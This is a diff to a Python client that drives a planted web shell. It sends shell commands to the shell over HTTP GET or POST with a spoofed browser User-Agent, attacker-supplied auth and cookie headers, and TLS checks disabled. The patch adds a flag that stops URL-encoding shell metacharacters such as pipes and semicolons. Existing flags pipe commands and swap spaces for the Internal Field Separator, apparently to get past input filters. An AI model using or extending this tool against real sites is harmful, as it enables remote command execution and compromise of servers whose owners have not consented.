@@ -4,6 +4,7 @@ import requests
 import readline
 import argparse
 import base64
+import urllib
 import urllib3
 import neotermcolor
 from neotermcolor import colored
@@ -19,6 +20,9 @@ def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
    "Authorization":args.auth, "Cookie":args.cookies}
    params = {param.strip():command.strip()}
+   if args.noenc:
+      headers.update({"Content-Type":"application/x-www-form-urlencoded"})
+      params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_[]{ }')
    if (method.upper() == "GET"):
       response = requests.get((webshell), params=params, headers=headers, verify=False)
    elif (method.upper() == "POST"):
@@ -47,6 +51,7 @@ parser.add_argument("method", help="HTTP Method to execute command (GET or POST)
 parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
 parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
 parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
+parser.add_argument("-ne", "--noenc", action="store_true", help="Disable URL encode on key chars")
 parser.add_argument("-np", "--nopre", action="store_true", help="Disable HTML <pre> tags parser")
 parser.add_argument("-pi", "--pipe", action="store_true", help="Pipe all commands after parameter")
 parser.add_argument("-ifs", "--ifs", action="store_true", help="Replace all white spaces with Internal Field Separator")
